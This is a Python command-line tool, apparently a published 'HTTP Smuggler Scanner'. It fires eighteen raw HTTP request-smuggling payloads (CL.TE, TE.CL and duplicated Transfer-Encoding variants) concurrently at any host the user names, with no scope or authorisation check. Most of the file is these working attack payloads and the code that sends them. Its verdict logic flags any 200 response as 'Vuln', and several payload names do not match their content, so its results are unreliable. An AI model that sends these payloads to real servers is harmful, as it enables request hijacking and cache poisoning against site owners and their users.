print("""
 /$$$$$$$           /$$$$$$                                             
| $$__  $$         /$$__  $$                                            
| $$  \ $$        | $$  \__/ /$$$$$$/$$$$  /$$   /$$  /$$$$$$   /$$$$$$ 
| $$$$$$$/ /$$$$$$|  $$$$$$ | $$_  $$_  $$| $$  | $$ /$$__  $$ /$$__  $$
| $$__  $$|______/ \____  $$| $$ \ $$ \ $$| $$  | $$| $$  \ $$| $$  \ $$
| $$  \ $$         /$$  \ $$| $$ | $$ | $$| $$  | $$| $$  | $$| $$  | $$
| $$  | $$        |  $$$$$$/| $$ | $$ | $$|  $$$$$$/|  $$$$$$$|  $$$$$$$
|__/  |__/         \______/ |__/ |__/ |__/ \______/  \____  $$ \____  $$
                                                     /$$  \ $$ /$$  \ $$
                                                    |  $$$$$$/|  $$$$$$/
                                                     \______/  \______/ 
========================================================================
[*] [HTTP Smuggler Scanner V 1.0] [Afrizal F.A - R&D ICWR]
========================================================================
""")

import socket
import ssl
import argparse
import atexit
from concurrent.futures import ThreadPoolExecutor as T

class R_Smuggler:

    def atExitFunc(self):

        if self.result != '':

            print("[+] [Result]")
            print("")
            print(self.result)

        else:

            print("[-] [No result]")

    def payloads(self, host):

        path = self.path

        payloads = {

            "CL.TE": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            "TE.CL": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\nG\r\n",
            "CL.TE_double_CRLF": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 12\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG\r\n",
            "TE.TE": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\nG\r\n",
            "TE.TE.2CL": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\nG\r\n",
            "CL.TE.CRLF": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 11\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nG\r\n",
            "TE.CLF": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n0\r\n\r\nG\r\n",
            "TE.CRLF": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nG\r\n",
            "CL.TE_identity": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG\r\n0\r\n\r\n",
            "TE.CLF_chunked": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nG\r\n",
            "CL.TE_gzip": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG\r\n",
            "TE.CRLF_chunked": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nG\r\n0\r\n\r\n",
            "TE.TE_keepalive": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\nG\r\n",
            "CL.TE_chunked_TE": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nG\r\n",
            "TE.TE_CRLF_chunked": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nG\r\n0\r\n\r\n",
            "TE.TE_2CL_CRLF_chunked": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\nG\r\n0\r\n\r\n",
            "TE.TE_CRLF_keepalive": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\nG\r\n",
            "TE.TE_CRLF_close": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\nG\r\n"

        }

        return payloads

    def smuggling(self, host, port, use_ssl, payload_name, payload):

        try:

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            if use_ssl and use_ssl.lower() == 'y':

                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname = host)
            
            sock.connect((host, port))
            sock.sendall(payload.encode())

            response = sock.recv(100).decode()
            status_code = response.split("\r\n")[0].split(" ")[1]

            if '200' in status_code:

                output = f"[+] [Vuln] [HOST: {host}] [PORT: {port}] [PATH: {self.path}] [Payload: {payload_name}] [HTTP Status Code: {status_code}]"
                print(output)

                self.result += "\n{}".format(output)

            else:

                print(f"[-] [Not Vuln] [HOST: {host}] [PORT: {port}] [PATH: {self.path}] [Payload: {payload_name}] [HTTP Status Code: {status_code}]")
                pass

            sock.close()

        except Exception as e:

            print(f"[-] [Error: {e}]")

    def proc(self):

        with T(max_workers = len(self.payloads(self.host).items())) as executor:

            for payload_name, payload in self.payloads(self.host).items():

                executor.submit(self.smuggling, self.host, self.port, self.ssl, payload_name, payload)

    def __init__(self, host, port = 80, ssl = '', path = ""):

        self.host = host
        self.port = port if port else 80
        self.ssl = ssl
        self.path = ("/{}".format(path) if path[0] != '/' else path) if path else "/"
        self.result = ''

        atexit.register(self.atExitFunc)

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("-x", "--host", help = "HOST Target", required = True)
    parser.add_argument("-p", "--port", help = "PORT (Default 80)", type = int)
    parser.add_argument("-s", "--ssl", help = "Use SSL (Y/N) (Default: N)")
    parser.add_argument("-d", "--path", help = "URL Path Target")
    args = parser.parse_args()

    smuggler = R_Smuggler(args.host, args.port, args.ssl, args.path)
    smuggler.proc()
